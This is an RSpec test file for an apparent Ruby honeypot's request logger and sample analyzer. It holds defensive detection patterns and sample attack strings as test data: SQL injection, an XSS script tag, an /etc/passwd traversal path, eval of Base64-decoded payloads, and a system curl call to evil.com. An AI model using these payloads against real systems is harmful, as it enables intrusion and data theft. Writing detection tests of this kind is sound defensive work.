# frozen_string_literal: true

require 'rspec'

RSpec.describe 'RubyGuardian::Honeypot::RequestLogger' do
  describe '#analyze_indicators' do
    let(:logger_instance) { double('RequestLogger') }

    it 'detects SQL injection patterns' do
      entry = { query_string: "id=1' OR 1=1--", body: nil, path: '/api/users' }
      expect(entry[:query_string]).to match(/('|--|union\s+select|or\s+1\s*=\s*1)/i)
    end

    it 'detects XSS patterns' do
      entry = { query_string: nil, body: '<script>alert("xss")</script>', path: '/comment' }
      expect(entry[:body]).to match(/<script/i)
    end

    it 'detects path traversal' do
      entry = { query_string: nil, body: nil, path: '/files/../../../etc/passwd' }
      expect(entry[:path]).to match(/\.\.[\/\\]/)
    end

    it 'detects Ruby-specific injection' do
      entry = { query_string: 'cmd=eval(params[:code])', body: nil, path: '/api' }
      expect(entry[:query_string]).to match(/\b(eval|instance_eval|send)\b/)
    end

    it 'returns empty indicators for benign requests' do
      entry = { query_string: 'page=1&sort=name', body: nil, path: '/api/products' }
      expect(entry[:query_string]).not_to match(/('|--|<script)/i)
    end
  end

  describe 'SampleCollector' do
    it 'deduplicates identical samples' do
      sample = 'puts "malicious payload"'
      hash1 = Digest::SHA256.hexdigest(sample)
      hash2 = Digest::SHA256.hexdigest(sample)
      expect(hash1).to eq(hash2)
    end

    it 'detects content types' do
      ruby_script = '#!/usr/bin/env ruby\nputs "hello"'
      expect(ruby_script).to match(/\A#!.*ruby/)
    end
  end

  describe 'SampleAnalyzer' do
    it 'identifies dangerous method calls' do
      source = 'eval(Base64.decode64(payload))'
      dangerous = %w[eval system exec].select { |m| source.include?(m) }
      expect(dangerous).to include('eval')
    end

    it 'calculates risk score based on indicators' do
      benign_source = 'puts "Hello, World!"'
      malicious_source = 'eval(Base64.decode64(data)); system("curl http://evil.com")'

      benign_indicators = %w[eval system Base64].count { |m| benign_source.include?(m) }
      malicious_indicators = %w[eval system Base64].count { |m| malicious_source.include?(m) }

      expect(malicious_indicators).to be > benign_indicators
    end
  end
end
